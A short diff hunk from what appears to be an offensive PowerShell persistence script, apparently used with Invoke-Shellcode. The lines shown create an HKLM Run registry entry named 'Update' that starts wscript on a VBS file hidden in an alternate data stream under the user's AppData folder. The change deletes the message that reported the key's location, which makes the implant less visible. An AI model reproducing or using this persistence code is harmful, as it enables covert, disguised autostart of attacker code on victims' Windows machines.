@@ -100,7 +100,7 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
     else {
         new-itemproperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Update -PropertyType String -Value "wscript.exe $env:USERPROFILE\AppData:$vbsFile" -Force
     }
-    "Process Complete. Persistent key is located at $RegPath\Update"
+    "Process Complete."
 }
 
 
